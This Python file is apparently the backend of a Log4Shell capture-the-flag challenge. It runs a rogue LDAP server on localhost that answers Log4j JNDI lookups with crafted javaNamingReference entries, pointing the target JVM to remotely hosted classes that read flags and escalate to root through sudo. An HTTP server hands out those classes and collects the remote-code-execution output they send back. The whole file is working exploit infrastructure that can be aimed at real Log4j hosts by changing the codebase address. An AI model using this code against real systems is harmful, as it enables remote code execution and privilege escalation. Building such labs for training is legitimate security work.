#!/usr/bin/env python3
"""
JNDI/LDAP Exploit Server for Yankee Log4Shell CTF Challenge
============================================================

Runs two internal services:
  - LDAP server  on 127.0.0.1:1389  (receives Log4j JNDI callbacks)
  - HTTP server  on 127.0.0.1:9999  (serves .class files + collects RCE output)

LDAP paths handled:
  /detect   -> records callback, returns FLAG1 in /internal/callbacks (no class loading)
  /exploit  -> serves FlagReader.class reference (RCE: reads flag2.txt + sudo -l)
  /privesc  -> serves PrivEsc.class reference (sudo python3 -> root flag)
  anything  -> treated as /detect

Multi-player safety:
  Both logs auto-clear every 3 minutes. Players have a short window to collect
  their flag after triggering the exploit (same pattern as Foxtrot webhook).
"""
import os
import json
import socket
import struct
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
FLAG1 = os.environ.get('FLAG1', 'dev_flag1')

JNDI_CALLBACKS = []  # [{time, path, message, flag, hint}, ...]
RCE_OUTPUTS    = []  # [{time, output}, ...]
LAST_CLEAR     = datetime.now()
LOCK           = threading.Lock()

CLEAR_INTERVAL = 180   # 3 minutes
MAX_ENTRIES    = 10
CLASS_DIR      = '/app/classes'


# ---------------------------------------------------------------------------
# Auto-clear background thread
# ---------------------------------------------------------------------------
def auto_clear_thread():
    global JNDI_CALLBACKS, RCE_OUTPUTS, LAST_CLEAR
    while True:
        time.sleep(CLEAR_INTERVAL)
        with LOCK:
            JNDI_CALLBACKS.clear()
            RCE_OUTPUTS.clear()
            LAST_CLEAR = datetime.now()
        print(f"[JNDI] Logs cleared at {datetime.now().strftime('%H:%M:%S')}")


def get_countdown():
    elapsed = (datetime.now() - LAST_CLEAR).total_seconds()
    remaining = max(0, CLEAR_INTERVAL - elapsed)
    m = int(remaining // 60)
    s = int(remaining % 60)
    return f"{m}m {s:02d}s"


# ---------------------------------------------------------------------------
# Minimal BER/DER encoding helpers for LDAP
# ---------------------------------------------------------------------------
def ber_len(n: int) -> bytes:
    """Encode an integer as a BER length."""
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    else:
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def ber_str(s, tag=0x04) -> bytes:
    """Encode a string or bytes as a BER OCTET STRING (or SET/SEQUENCE with tag)."""
    b = s.encode('utf-8') if isinstance(s, str) else s
    return bytes([tag]) + ber_len(len(b)) + b


def ber_seq(data: bytes, tag=0x30) -> bytes:
    """Wrap data in a BER SEQUENCE (or other constructed type)."""
    return bytes([tag]) + ber_len(len(data)) + data


def ldap_attribute(name: str, values: list) -> bytes:
    """
    Encode an LDAP PartialAttribute:
      SEQUENCE { type OCTET STRING, vals SET OF OCTET STRING }
    """
    type_enc = ber_str(name)
    vals_enc = b''.join(ber_str(v) for v in values)
    vals_set = ber_seq(vals_enc, tag=0x31)  # SET uses tag 0x31
    return ber_seq(type_enc + vals_set)


# ---------------------------------------------------------------------------
# LDAP response builders
# ---------------------------------------------------------------------------
def ldap_bind_response(msg_id: int) -> bytes:
    """
    LDAPMessage { messageID, BindResponse { resultCode=success } }
    """
    bind_resp = (
        bytes([0x0a, 0x01, 0x00])  # ENUMERATED resultCode=0 (success)
        + bytes([0x04, 0x00])       # matchedDN ""
        + bytes([0x04, 0x00])       # diagnosticMessage ""
    )
    # APPLICATION 1 = BindResponse = 0x61
    app1 = bytes([0x61]) + ber_len(len(bind_resp)) + bind_resp
    msg  = bytes([0x02, 0x01, msg_id]) + app1
    return ber_seq(msg)


def ldap_search_result_entry(msg_id: int, class_name: str, code_base: str) -> bytes:
    """
    SearchResultEntry containing Java JNDI reference attributes that cause
    the target JVM to fetch and load class_name from code_base.

    Requires JVM flag: -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
    """
    attrs = (
        ldap_attribute("objectClass",   ["javaNamingReference", "top"])
        + ldap_attribute("javaClassName",  [class_name])
        + ldap_attribute("javaCodeBase",   [code_base])
        + ldap_attribute("javaFactory",    [class_name])
    )
    attrs_seq    = ber_seq(attrs)
    entry_content = ber_str(b'') + attrs_seq           # empty objectName DN + attrs
    # APPLICATION 4 = SearchResultEntry = 0x64
    app4 = bytes([0x64]) + ber_len(len(entry_content)) + entry_content
    msg  = bytes([0x02, 0x01, msg_id]) + app4
    return ber_seq(msg)


def ldap_search_result_done(msg_id: int) -> bytes:
    """
    SearchResultDone { resultCode=success }
    """
    done = (
        bytes([0x0a, 0x01, 0x00])  # success
        + bytes([0x04, 0x00])
        + bytes([0x04, 0x00])
    )
    # APPLICATION 5 = SearchResultDone = 0x65
    app5 = bytes([0x65]) + ber_len(len(done)) + done
    msg  = bytes([0x02, 0x01, msg_id]) + app5
    return ber_seq(msg)


# ---------------------------------------------------------------------------
# LDAP server
# ---------------------------------------------------------------------------
def extract_path(data: bytes) -> str:
    """
    Determine which exploit path was requested by scanning the raw LDAP packet
    for known ASCII path strings. This works because the DN in the SearchRequest
    is a plain ASCII string (e.g. b'/exploit', b'privesc').
    """
    if b'privesc' in data:
        return 'privesc'
    if b'exploit' in data:
        return 'exploit'
    return 'detect'


def handle_ldap_client(conn: socket.socket, addr):
    try:
        conn.settimeout(3.0)
        all_data = b''

        # Read initial data (Bind + possibly Search if sent together)
        try:
            chunk = conn.recv(4096)
            if chunk:
                all_data += chunk
        except socket.timeout:
            return

        if not all_data:
            return

        # Message ID is at byte index 4 for short-form LDAP messages
        # LDAPMessage: 0x30 <len> 0x02 0x01 <msgID> ...
        msg_id = all_data[4] if len(all_data) > 4 else 1

        # Always respond to Bind with success
        conn.sendall(ldap_bind_response(msg_id))

        # Try to read the SearchRequest (may arrive in second TCP segment)
        try:
            extra = conn.recv(4096)
            if extra:
                all_data += extra
        except socket.timeout:
            pass  # search request was in initial data

        path      = extract_path(all_data)
        ts        = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        search_id = 2  # Log4j always uses sequential IDs starting at 1

        if path == 'detect':
            with LOCK:
                entry = {
                    'time': ts,
                    'path': path,
                    'message': 'Lookup request received. Connection established.',
                    'flag': FLAG1,
                    'hint': (
                        'Lookup confirmed. This server also supports '
                        'class-loading paths for deeper diagnostics.'
                    ),
                }
                JNDI_CALLBACKS.append(entry)
                if len(JNDI_CALLBACKS) > MAX_ENTRIES:
                    JNDI_CALLBACKS.pop(0)
            print(f"[LDAP] /detect callback from {addr[0]}")
            # No SearchResultEntry — just done (detection only)
            conn.sendall(ldap_search_result_done(search_id))

        elif path == 'exploit':
            with LOCK:
                JNDI_CALLBACKS.append({
                    'time': ts,
                    'path': path,
                    'message': 'Remote class request received. Loading...',
                })
                if len(JNDI_CALLBACKS) > MAX_ENTRIES:
                    JNDI_CALLBACKS.pop(0)
            print(f"[LDAP] /exploit class-load from {addr[0]}")
            code_base = 'http://127.0.0.1:9999/classes/'
            conn.sendall(ldap_search_result_entry(search_id, 'FlagReader', code_base))
            conn.sendall(ldap_search_result_done(search_id))

        elif path == 'privesc':
            with LOCK:
                JNDI_CALLBACKS.append({
                    'time': ts,
                    'path': path,
                    'message': 'Remote class request received. Loading...',
                })
                if len(JNDI_CALLBACKS) > MAX_ENTRIES:
                    JNDI_CALLBACKS.pop(0)
            print(f"[LDAP] /privesc class-load from {addr[0]}")
            code_base = 'http://127.0.0.1:9999/classes/'
            conn.sendall(ldap_search_result_entry(search_id, 'PrivEsc', code_base))
            conn.sendall(ldap_search_result_done(search_id))

    except Exception as e:
        print(f"[LDAP] Error handling {addr}: {e}")
    finally:
        try:
            # Wait for Java to read the SearchResultEntry before closing.
            # Java's LDAP reader thread is asynchronous — closing too fast causes
            # "socket closed" on the Java side before it processes the response.
            time.sleep(2.0)
            conn.close()
        except Exception:
            pass


def run_ldap_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 1389))
    sock.listen(10)
    print('[LDAP] Server listening on 127.0.0.1:1389')
    while True:
        try:
            conn, addr = sock.accept()
            t = threading.Thread(target=handle_ldap_client, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            print(f'[LDAP] Accept error: {e}')


# ---------------------------------------------------------------------------
# HTTP server (serves .class files + collects / exposes RCE output)
# ---------------------------------------------------------------------------
class ExploitHTTPHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass  # Suppress default access log

    def do_GET(self):
        if self.path == '/classes/FlagReader.class':
            self._serve_class('FlagReader.class')
        elif self.path == '/classes/PrivEsc.class':
            self._serve_class('PrivEsc.class')
        elif self.path == '/callbacks':
            self._json_response({'entries': JNDI_CALLBACKS,
                                  'next_clear': get_countdown(),
                                  'last_cleared': LAST_CLEAR.strftime('%Y-%m-%d %H:%M:%S')})
        elif self.path == '/rce-outputs':
            self._json_response({'entries': RCE_OUTPUTS,
                                  'next_clear': get_countdown(),
                                  'last_cleared': LAST_CLEAR.strftime('%Y-%m-%d %H:%M:%S')})
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/rce-output':
            length = int(self.headers.get('Content-Length', 0))
            body   = self.rfile.read(length).decode('utf-8', errors='replace')
            ts     = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with LOCK:
                RCE_OUTPUTS.append({'time': ts, 'output': body})
                if len(RCE_OUTPUTS) > MAX_ENTRIES:
                    RCE_OUTPUTS.pop(0)
            print(f'[HTTP] RCE output received ({len(body)} bytes)')
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

    def _serve_class(self, filename: str):
        path = os.path.join(CLASS_DIR, filename)
        if not os.path.exists(path):
            print(f'[HTTP] Class not found: {path}')
            self.send_response(404)
            self.end_headers()
            return
        with open(path, 'rb') as f:
            data = f.read()
        print(f'[HTTP] Serving {filename} ({len(data)} bytes)')
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _json_response(self, obj: dict):
        data = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def run_http_server():
    server = HTTPServer(('127.0.0.1', 9999), ExploitHTTPHandler)
    print('[HTTP] Server listening on 127.0.0.1:9999')
    server.serve_forever()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    threading.Thread(target=auto_clear_thread, daemon=True).start()
    threading.Thread(target=run_ldap_server, daemon=True).start()
    run_http_server()  # main thread
